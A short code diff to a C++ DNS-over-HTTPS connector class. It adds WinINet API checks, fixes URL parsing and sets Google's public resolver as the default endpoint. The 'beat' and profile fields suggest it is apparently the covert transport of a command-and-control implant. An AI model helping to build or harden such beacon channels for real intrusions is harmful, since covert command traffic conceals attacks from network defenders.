@@ -204,6 +204,11 @@ ConnectorDoH::~ConnectorDoH()
 
 BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
 {
+    // Verify WinINet APIs are loaded
+    if (!this->functions || !this->functions->InternetOpenA || !this->functions->HttpSendRequestA) {
+        return FALSE;
+    }
+
     this->profile = profile;
 
     if (profile.encrypt_key) {
@@ -223,11 +228,11 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
     else
         this->domain[0] = 0;
 
-    if (profile.urls) {
+    this->urlCount = 0;
+    if (profile.urls && profile.urls[0]) {
         lstrcpynA(this->rawUrls, (CHAR*)profile.urls, sizeof(this->rawUrls));
         
         // Split by comma
-        this->urlCount = 0;
         CHAR* p = this->rawUrls;
         CHAR* start = p;
         while (*p) {
@@ -247,6 +252,14 @@ BOOL ConnectorDoH::SetConfig(ProfileDoH profile, BYTE* beat, ULONG beatSize)
              while (*start == ' ') start++;
              if (*start) this->urlList[this->urlCount++] = start;
         }
+    }
+    
+    // Fallback: If no URLs provided, use Google DNS as default
+    if (this->urlCount == 0) {
+        CHAR defaultUrl[] = "https://dns.google/dns-query";
+        lstrcpynA(this->rawUrls, defaultUrl, sizeof(this->rawUrls));
+        this->urlList[0] = this->rawUrls;
+        this->urlCount = 1;
     }
     
     if (!beat || !beatSize || beatSize < 8)
